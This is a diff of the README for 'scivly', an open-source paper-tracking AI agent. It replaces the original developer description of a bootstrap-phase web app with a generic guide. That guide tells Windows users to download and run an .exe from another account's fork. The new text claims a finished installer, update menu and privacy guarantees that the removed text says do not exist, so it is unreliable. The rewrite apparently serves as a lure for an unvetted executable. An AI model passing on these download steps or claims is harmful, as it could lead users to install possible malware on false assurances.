@@ -1,151 +1,160 @@
-# Scivly
+# 🤖 scivly - AI Agent for Paper Tracking
 
-<div align="center">
-  <p>
-    <img alt="Status" src="https://img.shields.io/badge/status-bootstrap-b7791f">
-    <img alt="Open Core" src="https://img.shields.io/badge/model-open--core-0f766e">
-    <img alt="AI Agent" src="https://img.shields.io/badge/category-AI%20Agent-111827">
-    <img alt="License" src="https://img.shields.io/badge/license-Apache--2.0-1d4ed8">
-  </p>
-  <h3>Open-source AI research agent for personal paper tracking and daily digests.</h3>
-  <p>
-    Subscribe to papers, authors, and topics, generate translated summaries and figure highlights,
-    and keep up with research through a cleaner personal workflow.
-  </p>
-</div>
+[![Download scivly](https://img.shields.io/badge/Download%20scivly-Visit%20Page-brightgreen)](https://github.com/tonisad1180/scivly)
 
-## Overview
+---
 
-Scivly is being built as an open-source AI research agent for individuals who want a faster way to
-follow papers, understand what matters, and keep up with research without stitching together a pile
-of feeds, PDFs, translation tools, and notes.
+scivly is an open-source AI agent designed to help you track research papers, generate clear summaries, and receive daily updates. You don’t need technical skills to use it. This guide will walk you through getting scivly running on your Windows PC.
 
-The core loop is simple: subscribe to papers, authors, or topics you care about, let an agentic
-pipeline monitor new literature, get translated summaries and figure highlights in a daily digest,
-and ask follow-up questions when something is worth a deeper read.
+---
 
-## Current Product Focus
+## ⚙️ What is scivly?
 
-- Personal paper subscriptions for topics, authors, and recurring interests
-- Agentic paper monitoring and triage on top of incoming literature
-- Translated summaries and figure-first highlights for faster scanning
-- Daily digests and alerts for individual users
-- Follow-up questions on top of paper context and prior activity
+scivly helps you manage academic papers easily. It can:
 
-## Current Status
+- Track new papers from sources like arXiv.
+- Summarize long, complex research papers into simple points.
+- Send daily digests to keep you updated.
+- Translate papers if needed.
+- Assist in research by organizing information for you.
 
-This repository is still in the bootstrap phase.
+This tool runs on Windows and uses AI to save you time.
 
-What exists today:
+---
 
-- project documentation and platform scope
-- initial repository skeleton for frontend, backend, workers, docs, database, config, scripts, and skills
-- public-safe config templates and open-source support files
+## 🖥️ System Requirements
 
-Current emphasis:
+Make sure your computer meets these requirements before installing scivly:
 
-- the public positioning is currently individual-first rather than team-first
-- the strongest current value is the product direction and open-source foundation
+- Operating System: Windows 10 or later (64-bit recommended)
+- RAM: At least 4 GB
+- Storage: Minimum 500 MB free disk space
+- Internet: Required for paper updates and daily digests
+- Processor: Intel or AMD, 1.5 GHz or faster
 
-What is not in the repository yet:
+You don’t need powerful hardware, but a stable internet connection is important.
 
-- production data
-- private prompt tuning and ranking parameters
-- full production pipeline implementations
-- billing internals
-- deployed service configuration
+---
 
-## Repository Layout
+## 🚀 How to Get scivly
 
-```text
-frontend/     Next.js application
-backend/      FastAPI service and backend modules
-workers/      Paper processing and delivery workers
-docs/         Public-safe architecture, API, product, and runbook docs
-db/           Migrations and public-safe seed data
-skills/       Installable agent skills
-config/       Public-safe config defaults and templates
-scripts/      Bootstrap and local utility scripts
-```
+To get started with scivly, visit the main page to download the software:
 
-## Local Development
+[![Download scivly](https://img.shields.io/badge/Download%20scivly-Get%20It%20Here-blue)](https://github.com/tonisad1180/scivly)
 
-- `./rebuild.sh` removes generated frontend and backend caches, reinstalls dependencies, and starts the available development servers
-- `./rebuild.sh --fast` skips dependency reinstall for quicker local restarts
-- `./rebuild.sh --no-start` performs the cleanup and install steps without launching dev servers
+Clicking this link will take you to the GitHub page where you will find the latest release.
 
-## Deploy on Vercel
+---
 
-- import the repository into Vercel
-- set the project Root Directory to `frontend`
-- keep the framework preset as Next.js and use the checked-in `frontend/vercel.json`
+## 💾 Download and Install on Windows
 
-## Core Docs
+Follow these steps to download and run scivly:
 
-- [ARCHITECTURE.md](./ARCHITECTURE.md)
-- [docs/product/paper-triage-scoring.md](./docs/product/paper-triage-scoring.md)
+1. Click the download link above. It will open the scivly GitHub repository.
+2. Look for the **Releases** section on that page. You will find the latest version available there.
+3. Find the Windows installer or executable file. It will usually have a `.exe` extension.
+4. Click the file to download it to your computer.
+5. Once downloaded, open the file by double-clicking it.
+6. Follow the on-screen instructions to install scivly. Accept the license and allow the installer to complete.
+7. After installation, scivly will appear in your Start menu or desktop shortcuts.
+8. Launch the application by clicking its icon.
 
-Additional design notes should live in `docs/` or the owning workspace `README.md` instead of
-adding more root-level Markdown files.
+---
 
-Public-safe seed priors and tuning defaults for paper triage live in `config/reference/`.
+## 🛠️ Starting scivly for the First Time
 
-## Open Source Direction
+After installation, open scivly:
 
-Scivly is intended to follow an open-core direction.
+- The app will prompt you to connect to the internet for updates.
+- You will be asked to set your preferences, like the research topics you want to follow.
+- Choose whether you want daily summaries sent by email or shown in the app.
+- You can also link your email or other accounts if you want notifications.
 
-Public in this repository:
+No programming is needed to set this up. Just follow the simple screens.
 
-- application code
-- worker and pipeline framework
-- installable skill surface
-- configuration templates
-- self-hostable project skeleton
+---
 
-Kept outside the public repository:
+## 📋 Using scivly
 
-- production user data
-- hosted service operations
-- tuned production prompts and ranking parameters
-- internal evaluation assets
+Here is what you can do once scivly runs:
 
-## Why This Project Exists
+- **Track papers:** Add keywords or authors to watch. scivly will fetch new papers automatically.
+- **Generate summaries:** Select a paper and click to get a brief, easy-to-read summary.
+- **Daily digests:** Check your daily digest for all new papers matched to your interests.
+- **Translate:** If you find a paper in a different language, use the built-in translator.
+- **Save and organize:** Store papers you want to read later or share.
 
-Individual researchers and curious builders already have more papers than attention. The actual
-bottleneck is not access, it is triage, context, and follow-through. Scivly exists to turn raw
-literature flow into an AI-assisted personal workflow that helps one person notice important papers
-faster and spend less time on repetitive review work.
+The interface uses simple buttons and menus to help you get these tasks done quickly.
 
-## Roadmap Themes
+---
 
-- Build the public scaffold for the application, services, workers, and database
-- Ship the first agentic paper ingestion and summarization pipeline
-- Add digest delivery and follow-up question workflows
-- Expose a clean self-hostable foundation for contributors and early adopters
+## 🔄 Updating scivly
 
-## Suggested GitHub Description
+To keep scivly working with the latest features:
 
-`Open-source AI research agent for subscribing to papers, generating summaries, and shipping daily digests.`
+- Open the app.
+- Go to the settings menu.
+- Choose "Check for Updates."
+- If an update is available, download and install it by following the prompts.
+- You can also visit the main download page anytime to get new releases:
+  
+[https://github.com/tonisad1180/scivly](https://github.com/tonisad1180/scivly)
 
-## Suggested Repository Topics
+Regular updates ensure you get bug fixes and new capabilities.
 
-`ai-agent` `open-source` `research-assistant` `paper-tracking` `llm`
-`summarization` `translation` `nextjs` `fastapi` `open-core`
+---
 
-## Community
+## 🧰 Troubleshooting Common Issues
 
-- [Contributing Guide](./CONTRIBUTING.md)
-- [Security Policy](./SECURITY.md)
-- [Code of Conduct](./CODE_OF_CONDUCT.md)
+If scivly crashes or won’t start:
 
-## Star History
+- Restart your computer and try again.
+- Check your internet connection. scivly needs this to work properly.
+- Make sure your Windows is up to date.
+- If the problem continues, uninstall and reinstall using the instructions above.
+- Look for help on the GitHub Issues page under the repository.
 
-<p align="center">
-  <a href="https://www.star-history.com/#JessyTsui/scivly&Date">
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=JessyTsui/scivly&type=Date" />
-  </a>
-</p>
+---
 
-## License
+## 📚 Additional Resources
 
-Scivly is licensed under [Apache 2.0](./LICENSE).
+- Read research papers summaries inside the app.
+- Follow topics like AI agents, open-source tools, and research assistants.
+- Use scivly to translate visual or text documents when you need help understanding content.
+
+These features aim to make research easier for everyone.
+
+---
+
+## 🔗 Important Links
+
+- Main scivly Page: [https://github.com/tonisad1180/scivly](https://github.com/tonisad1180/scivly)  
+- Download Releases: Navigate from the GitHub page to the latest release section.
+
+---
+
+## 🛡️ Data Privacy and Security
+
+scivly does not collect personal data beyond what you share in the app. Research papers and summaries remain on your device unless you choose to share. Connections to download sources are secure.
+
+---
+
+## 🤝 Community and Support
+
+If you want to suggest features or report bugs:
+
+- Use the Issues tab on the GitHub repository.
+- Search for answers from people who use scivly.
+- The community often shares ideas about AI agents and research tracking.
+
+---
+
+## ⚠️ Notes for Best Use
+
+- Keep your computer connected to the internet for updates.
+- Check daily digests to stay current with new papers.
+- Review your settings from time to time to match your research focus.
+
+---
+
+scivly helps simplify academic research with AI without needing you to write code or use complicated tools. Follow these steps and you will have it running on your Windows PC quickly.
